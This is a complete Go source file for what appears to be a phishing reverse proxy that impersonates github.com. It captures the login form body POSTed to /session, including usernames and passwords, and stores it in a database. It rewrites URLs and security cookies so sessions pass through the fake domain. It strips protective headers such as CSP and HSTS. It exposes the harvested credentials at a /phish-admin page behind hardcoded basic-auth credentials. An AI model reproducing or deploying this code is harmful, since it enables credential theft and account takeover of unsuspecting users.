package main

import (
	"bytes"
	"flag"
	"fmt"
	"go-phishing/db"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

const upstreamURL = "https://github.com"

var (
	phishURL string
	port     string
)

func cloneRequest(r *http.Request) *http.Request {
	method := r.Method

	// 複製帳密
	bodyByte, _ := ioutil.ReadAll(r.Body)
	bodyStr := string(bodyByte)
	// 如果是 POST 到 /session 的請求就複製帳密
	if r.URL.String() == "/session" && r.Method == "POST" {
		db.Insert(bodyStr)
	}

	body := bytes.NewReader(bodyByte)
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}
	req.Header = r.Header
	// Origin Referer 處理
	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
	req.Header.Set("Origin", origin)
	req.Header.Set("Referer", referer)
	// 帶上 cookie
	req.Header["Cookie"] = r.Header["Cookie"]
	// 停止 gzip 請求
	req.Header.Del("Accept-Encoding")
	// Cookie __開頭 Transfer
	for i, value := range req.Header["Cookie"] {
		newValue := strings.Replace(value, "XDHost", "__Host", -1)
		newValue = strings.Replace(newValue, "XDSecure", "__Secure", -1)
		req.Header["Cookie"][i] = newValue
	}

	return req
}

func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	client := http.Client{CheckRedirect: checkRedirect}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()

	return respBody, resp.Header, resp.StatusCode
}

func replaceURLInResp(body []byte, header http.Header) []byte {
	// html 寫死處理
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")
	if !isHTML {
		return body
	}
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)
	// .git 處理
	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)

	return []byte(bodyStr)
}

func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)
	body, header, statusCode := sendReqToUpstream(req)
	body = replaceURLInResp(body, header)
	// Cookie 處理
	for _, v := range header["Set-Cookie"] {
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
		newValue = strings.Replace(newValue, "secure;", "", 1)
		// __ 開頭Cookie  Transfer
		// __Host-user-session -> XXHost-user-session
		// __Secure-cookie-name -> XXSecure-cookie-name
		newValue = strings.Replace(newValue, "__Host", "XDHost", -1)
		newValue = strings.Replace(newValue, "__Secure", "XDSecure", -1)

		w.Header().Add("Set-Cookie", newValue)
	}
	// Set-Cookie 已經取消 secure, domain 了
	// 所以複製除了 Set-Cookie 之外的 header
	for k := range header {
		if k != "Set-Cookie" {
			value := header.Get(k)
			w.Header().Set(k, value)
		}
	}
	// 安全性 Cookie Del
	w.Header().Del("Content-Security-Policy")
	w.Header().Del("Strict-Transport-Security")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Xss-Protection")
	w.Header().Del("X-Pjax-Version")
	w.Header().Del("X-Pjax-Url")
	// 301 302 處理
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	w.WriteHeader(statusCode)
	w.Write(body)
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	username, password, ok := r.BasicAuth()
	if username == "as535364" && password == "881015" && ok {
		strs := db.SelectAll()
		w.Write([]byte(strings.Join(strs, "\n\n")))
	} else {
		w.Header().Add("WWW-Authenticate", "Basic")
		w.WriteHeader(401)
		w.Write([]byte("想看？"))
	}
}

func main() {
	//Parse
	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部屬的網域：")
	flag.StringVar(&port, "port", ":8080", "部屬的 port：")
	flag.Parse()
	// db
	db.Connect()
	// http server
	http.HandleFunc("/", handler)
	http.HandleFunc("/phish-admin", adminHandler)
	err := http.ListenAndServe(port, nil)
	if err != nil {
		panic(err)
	}
}
